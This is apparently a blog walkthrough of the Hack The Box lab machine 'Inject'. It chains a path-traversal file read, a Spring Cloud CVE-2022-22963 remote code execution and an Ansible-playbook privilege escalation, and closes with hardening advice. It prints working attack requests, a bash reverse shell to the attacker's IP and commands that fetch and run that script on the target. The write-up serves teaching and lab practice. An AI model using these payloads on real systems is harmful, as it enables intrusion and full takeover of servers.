---
layout: post
title: Hack The Box Walkthrough - Inject
date: 2023-04-23
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2023/04/HTB/Inject
img: 2023/04/Inject/Inject.png
---

In Inject, I had to exploit a file read vulnerability to extract the Maven configuration and learn that the application was vulnerable to Remote Code Execution. Next, I found a password in another Maven configuration file and finally used Ansible to get root.

* Room: Inject
* Difficulty: Medium
* URL: [https://app.hackthebox.com/machines/Inject](https://app.hackthebox.com/machines/Inject)
* Author: [rajHere](https://app.hackthebox.com/users/396413)

## Enumeration

I launched Rustscan to look for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
 Nmap? More like slowmap.🐢
[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.11.204:22
Open 10.10.11.204:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

...

Nmap scan report for target (10.10.11.204)
Host is up, received conn-refused (0.030s latency).
Scanned at 2023-03-31 08:00:51 EDT for 8s

PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKZNtFBY2xMX8oDH/EtIMngGHpVX5fyuJLp9ig7NIC9XooaPtK60FoxOLcRr4iccW/9L2GWpp6kT777UzcKtYoijOCtctNClc6tG1hvohEAyXeNunG7GN+Lftc8eb4C6DooZY7oSeO++PgK5oRi3/tg+FSFSi6UZCsjci1NRj/0ywqzl/ytMzq5YoGfzRzIN3HY
dFF8RHoW8qs8vcPsEMsbdsy1aGRbslKA2l1qmejyU9cukyGkFjYZsyVj1hEPn9V/uVafdgzNOvopQlg/yozTzN+LZ2rJO7/CCK3cjchnnPZZfeck85k5sw1G5uVGq38qcusfIfCnZlsn2FZzP2BXo5VEoO2IIRudCgJWTzb8urJ6JAWc1h0r6cUlxGdOvSSQQO6Yz1MhN9omUD9r4A5ag4cbI09c1KOnjzIM8hAWlwU
DOKlaohgPtSbnZoGuyyHV/oyZu+/1w4HJWJy6urA43u1PFTonOyMkzJZihWNnkHhqrjeVsHTywFPUmTODb8=
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIUJSpBOORoHb6HHQkePUztvh85c2F5k5zMDp+hjFhD8VRC2uKJni1FLYkxVPc/yY3Km7Sg1GzTyoGUxvy+EIsg=
|   256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICZzUvDL0INOklR7AH+iFw+uX+nkJtcw7V+1AsMO9P7p
8080/tcp open  nagios-nsca syn-ack Nagios NSCA
|_http-title: Home
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:00
Completed NSE at 08:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:00
Completed NSE at 08:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:00
Completed NSE at 08:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.03 seconds
```

Port 22 (SSH) and 8080 (HTTP) were open. 

## Website

I open the website in my browser.

![Zodd Cloud Website](/assets/images/2023/04/Inject/ZoddCloudSite.png "Zodd Cloud Website")

It was an application to store files on the cloud. The 'Log in' button did not do anything. And the 'Sign Up' button sent me to a page that was under construction.

![Under Construction](/assets/images/2023/04/Inject/UnderConstruction.png "Under Construction")

### Files Read 

There was an 'Upload' link on the page even if I was not connected to the application. I tried it, I was able to upload files to the server.

![File Uploaded](/assets/images/2023/04/Inject/Uploaded.png "File Uploaded")

After I uploaded an image, I had a link to look at it. I tried uploading some source code files, but they were rejected.

The way the images were displayed was interesting. I did not have a direct link to the image, they were passed in the 'img' parameter of the query string: 'http://target.htb:8080/show_image?img=image.png'. I tried to read the passwd file.

```http
GET /show_image?img=../../../../../../etc/passwd HTTP/1.1
Host: target.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

It worked.

```http
HTTP/1.1 200
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 1986
Date: Fri, 31 Mar 2023 12:23:05 GMT
Connection: close

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
```

I was able to read arbitrary files from the server. I looked for interesting files. I failed to read files in '/proc/environ', so I could not see how the application was running. But looking at the source and the web requests, I saw mentions of 'webjars' which hinted at Java. After some looking around, I found the [POM file](https://maven.apache.org/guides/introduction/introduction-to-the-pom.html).

```http
GET /show_image?img=../../../pom.xml HTTP/1.1
Host: target.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://target.htb:8080/upload
Connection: close
Upgrade-Insecure-Requests: 1
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
	<dependencies>
		<dependency>
  			<groupId>com.sun.activation</groupId>
  			<artifactId>javax.activation</artifactId>
  			<version>1.2.0</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-thymeleaf</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-devtools</artifactId>
			<scope>runtime</scope>
			<optional>true</optional>
		</dependency>

		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>bootstrap</artifactId>
			<version>5.1.3</version>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>webjars-locator-core</artifactId>
		</dependency>

	</dependencies>
	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<version>${parent.version}</version>
			</plugin>
		</plugins>
		<finalName>spring-webapp</finalName>
	</build>

</project>
```

### Remote Code Execution (RCE)

The application was running [Spring Cloud 3.2.2](https://spring.io/projects/spring-cloud). This version was vulnerable to [CVE-2022-22963](https://nvd.nist.gov/vuln/detail/CVE-2022-22963). This allowed to use the routing functionality to [run code by passing it a 'routing-expression' header](https://sysdig.com/blog/cve-2022-22963-spring-cloud/).


I used the provided example to try execute a simple command on the server. 

```bash
$ curl -i -s -k -X $'POST' -H $'Host: target.htb:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"wget 10.10.14.7")' --data-binary $'exploit_poc' $'http://target.htb:8080/functionRouter'

HTTP/1.1 500
Content-Type: application/json
Transfer-Encoding: chunked
Date: Sat, 01 Apr 2023 16:11:21 GMT
Connection: close

{"timestamp":"2023-04-01T16:11:21.274+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}%
```

I got a hit on my web server.

```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.204 - - [01/Apr/2023 12:11:15] "GET / HTTP/1.1" 200 -
```

I created a small script to execute a reverse shell.

```bash
$ cat shell.sh
#!/usr/bin/env bash

bash -i >& /dev/tcp/10.10.14.7/4444 0>&1
```

Then I used the vulnerability to download the script and execute it on the server.

```bash
$ curl -i -s -k -X $'POST' -H $'Host: target.htb:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.14.7/shell.sh -o /tmp/shell.sh")' --data-binary $'exploit_poc' $'http://target.htb:8080/functionRouter'

$ curl -i -s -k -X $'POST' -H $'Host: target.htb:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/shell.sh")' --data-binary $'exploit_poc' $'http://target.htb:8080/functionRouter'
```

It got the reverse shell as frank.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.11.204] 53222
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$
```
## Configuration File

I tried to run `sudo`, but I did not have frank's password. I looked around frank's home directory and found an interesting settings file.

```bash
frank@inject:~$ sudo -l
[sudo] password for frank:

frank@inject:~$ ls -la
total 28
drwxr-xr-x 5 frank frank 4096 Feb  1 18:38 .
drwxr-xr-x 4 root  root  4096 Feb  1 18:38 ..
lrwxrwxrwx 1 root  root     9 Jan 24 13:57 .bash_history -> /dev/null
-rw-r--r-- 1 frank frank 3786 Apr 18  2022 .bashrc
drwx------ 2 frank frank 4096 Feb  1 18:38 .cache
drwxr-xr-x 3 frank frank 4096 Feb  1 18:38 .local
drwx------ 2 frank frank 4096 Feb  1 18:38 .m2
-rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile

frank@inject:~$ ls .m2/
settings.xml

frank@inject:~$ cat .m2/settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>REDACTED</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

It contained a password for phil. I tried it and it worked.

```bash
frank@inject:~$ su phil
Password:

phil@inject:/home/frank$ cd ~

phil@inject:~$ cat user.txt
REDACTED
```

## Ansible

To get root, I looked at what phil could run with sudo. And I looked for any suid binaries.

```bash
phil@inject:~$ sudo -l
[sudo] password for phil:
Sorry, user phil may not run sudo on localhost.

phil@inject:~$ find / -perm /u=s 2>/dev/null
/usr/bin/su
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

I did not see anything I could use. I looked at phil's groups and what they had access to.

```bash
phil@inject:~$ groups
phil staff

phil@inject:~$ find / -group staff 2>/dev/null
/opt/automation/tasks
/root
/var/local
/usr/local/lib/python3.8
/usr/local/lib/python3.8/dist-packages
/usr/local/lib/python3.8/dist-packages/ansible_parallel.py

phil@inject:/$ ls -la /opt/automation/
total 12
drwxr-xr-x 3 root root  4096 Oct 20  2022 .
drwxr-xr-x 3 root root  4096 Oct 20  2022 ..
drwxrwxr-x 2 root staff 4096 Apr 23 12:34 tasks

phil@inject:/$ ls -la /opt/automation/tasks/
total 12
drwxrwxr-x 2 root staff 4096 Apr 23 12:34 .
drwxr-xr-x 3 root root  4096 Oct 20  2022 ..
-rw-r--r-- 1 root root   150 Apr 23 12:34 playbook_1.yml

phil@inject:/$ cat /opt/automation/tasks/playbook_1.yml 
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```

They were a member of the 'staff' group. This group could write to '/opt/automation/tasks'. The folder already contained an [Ansible Playbook](https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_intro.html).

I thought I might be able to create a playbook and get Ansible to run any commands I wanted. But first I had to check it was running. I downloaded [pspy](https://github.com/DominicBreuker/pspy) on the server and ran it.

```bash
2023/04/01 16:58:05 CMD: UID=0     PID=16285  | chmod u+x /root/.ansible/tmp/ansible-tmp-1680368285.048794-16270-218024435563957/ /root/.ansible/tmp/ansible-tmp-1680368285.048794-16270-218024435563957/AnsiballZ_command.py
2023/04/01 16:58:05 CMD: UID=0     PID=16286  | /bin/sh -c chmod u+x /root/.ansible/tmp/ansible-tmp-1680368285.048794-16270-218024435563957/ /root/.ansible/tmp/ansible-tmp-1680368285.048794-16270-218024435563957/AnsiballZ_command.py && sleep 0
2023/04/01 16:58:05 CMD: UID=0     PID=16287  |
2023/04/01 16:58:05 CMD: UID=0     PID=16288  | /bin/sh -c /usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1680368285.048794-16270-218024435563957/AnsiballZ_command.py && sleep 0
2023/04/01 16:58:05 CMD: UID=0     PID=16289  | /usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1680368285.048794-16270-218024435563957/AnsiballZ_command.py
2023/04/01 16:58:06 CMD: UID=0     PID=16290  |
2023/04/01 16:58:06 CMD: UID=0     PID=16291  |
2023/04/01 16:58:06 CMD: UID=0     PID=16292  | chmod u+x /root/.ansible/tmp/ansible-tmp-1680368284.948079-16251-136173806715512/ /root/.ansible/tmp/ansible-tmp-1680368284.948079-16251-136173806715512/AnsiballZ_systemd.py
2023/04/01 16:58:06 CMD: UID=0     PID=16293  | sleep 0
2023/04/01 16:58:06 CMD: UID=0     PID=16294  | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml
```

It showed that the playbook was being executed as root. I created a new playbook that used the [shell module](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html) to execute code.

I created a task that would copy bash to phil's home folder and set the suid bit.


```bash
phil@inject:~$ cat playbook_3.yml
- hosts: localhost
  tasks:
  - name: cp
    ansible.builtin.shell:
      cmd: cp /bin/bash /home/phil/
  - name: chmod
    ansible.builtin.shell:
      cmd: chmod u+s /home/phil/bash

phil@inject:~$ cp playbook_3.yml /opt/automation/tasks/
```

I waited for the cron to run. After a few seconds, bash was there with the bit set. I ran it and got the root flag.

```bash
phil@inject:~$ ls -ltrh
total 4.2M
-rw-r----- 1 root phil   33 Apr  1 13:23 user.txt
-rwxrwxr-x 1 phil phil 3.0M Apr  1 16:48 pspy64
-rw-rw-r-- 1 phil phil  106 Apr  1 16:55 playbook_2.yml
-rw-rw-r-- 1 phil phil  184 Apr  1 17:04 playbook_3.yml
-rwsr-xr-x 1 root root 1.2M Apr  1 17:06 bash

phil@inject:~$ ./bash -p

bash-5.0# cd /root/

bash-5.0# cat root.txt
REDACTED
```

## Hardening the Box

The first step in fixing this machine is to update the dependencies. The Spring Cloud version has a vulnerability that is easy to exploit and allows running code on the server. An update would have prevented that.

Next, having the password of a user in a plaintext file is a bad idea. This appears to be the way [Maven store the credentials](https://maven.apache.org/settings.html#servers) to avoid having them in 'pom.xml'. They can at least be encrypted. And frank should not have access to phil's credentials.

The last issue was having phil creating Ansible playbooks that gets run by root. If phil is allowed to modify the system, maybe they should use sudo to do it. Or at least they should protect their credentials to prevent anyone with access to the machine from using their privileges.